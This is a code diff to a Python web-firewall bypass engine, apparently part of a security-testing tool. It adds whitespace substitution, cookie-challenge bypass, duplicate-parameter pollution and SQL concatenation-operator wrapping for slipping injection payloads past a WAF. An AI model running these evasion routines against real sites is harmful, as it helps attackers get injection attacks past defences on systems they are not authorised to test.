@@ -409,6 +409,99 @@ class WAFBypassEngine:
                         "comment_used": comment,
                         "response": response,
                     }
+
+        # Whitespace obfuscation
+        elif strategy_name == "whitespace":
+            for whitespace_token in strategy.get("whitespace", []):
+                token = str(whitespace_token)
+                test_payload = payload.replace(" ", token)
+                response = await self._send_request(
+                    url,
+                    test_payload,
+                    param_name,
+                    method,
+                    base_headers,
+                )
+                if self._is_bypass_successful(response):
+                    return {
+                        "success": True,
+                        "status_code": response.status_code,
+                        "content_length": len(response.content),
+                        "whitespace_used": token,
+                        "response": response,
+                    }
+
+        # Cookie challenge bypass
+        elif strategy_name == "cookie_bypass":
+            raw_cookies = strategy.get("cookies", {})
+            if isinstance(raw_cookies, dict) and raw_cookies:
+                cookie_header = "; ".join(
+                    f"{str(k).strip()}={str(v).strip()}"
+                    for k, v in raw_cookies.items()
+                    if str(k).strip()
+                )
+                if cookie_header:
+                    headers = self._merge_headers(base_headers, {"Cookie": cookie_header})
+                    response = await self._send_request(
+                        url,
+                        payload,
+                        param_name,
+                        method,
+                        headers,
+                    )
+                    if self._is_bypass_successful(response):
+                        return {
+                            "success": True,
+                            "status_code": response.status_code,
+                            "content_length": len(response.content),
+                            "cookie_header": cookie_header,
+                            "response": response,
+                        }
+
+        # Duplicate parameter / parameter pollution checks
+        elif strategy_name == "parameter_pollution":
+            response = await self._send_parameter_pollution_request(
+                url=url,
+                payload=payload,
+                param_name=param_name,
+                method=method,
+                headers=base_headers,
+            )
+            if self._is_bypass_successful(response):
+                return {
+                    "success": True,
+                    "status_code": response.status_code,
+                    "content_length": len(response.content),
+                    "technique": strategy.get("technique", "duplicate_params"),
+                    "response": response,
+                }
+
+        # Concatenation operator variants
+        elif strategy_name == "concatenation":
+            for operator in strategy.get("operators", []):
+                op = str(operator)
+                if not op:
+                    continue
+                if op.upper().startswith("CONCAT"):
+                    prefix = op if op.endswith("(") else f"{op}("
+                    test_payload = f"{prefix}'{payload}','x')"
+                else:
+                    test_payload = f"{payload}{op}1"
+                response = await self._send_request(
+                    url,
+                    test_payload,
+                    param_name,
+                    method,
+                    base_headers,
+                )
+                if self._is_bypass_successful(response):
+                    return {
+                        "success": True,
+                        "status_code": response.status_code,
+                        "content_length": len(response.content),
+                        "operator_used": op,
+                        "response": response,
+                    }
         
         # Default: try payload as-is
         response = await self._send_request(
@@ -423,6 +516,40 @@ class WAFBypassEngine:
             }
         
         return {"success": False, "reason": "WAF blocked all attempts"}
+
+    async def _send_parameter_pollution_request(
+        self,
+        *,
+        url: str,
+        payload: str,
+        param_name: str,
+        method: str,
+        headers: dict[str, str] | None,
+    ) -> httpx.Response:
+        """Send duplicated parameter values for pollution testing."""
+        from urllib.parse import parse_qsl, quote_plus, urlencode, urlparse, urlunparse
+
+        try:
+            if method.upper() == "GET":
+                parsed = urlparse(url)
+                query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
+                query_pairs.append((param_name, payload))
+                query_pairs.append((param_name, f"{payload}_dup"))
+                polluted_url = urlunparse(parsed._replace(query=urlencode(query_pairs, doseq=True)))
+                return await self.client.get(polluted_url, headers=headers)
+
+            body = (
+                f"{quote_plus(param_name)}={quote_plus(payload)}&"
+                f"{quote_plus(param_name)}={quote_plus(f'{payload}_dup')}"
+            )
+            req_headers = dict(headers or {})
+            req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
+            if method.upper() == "POST":
+                return await self.client.post(url, content=body, headers=req_headers)
+            return await self.client.request(method, url, content=body, headers=req_headers)
+        except Exception as exc:
+            logger.error("Parameter pollution request failed: %s", exc)
+            return httpx.Response(status_code=0, content=b"")
 
     @staticmethod
     def _merge_headers(
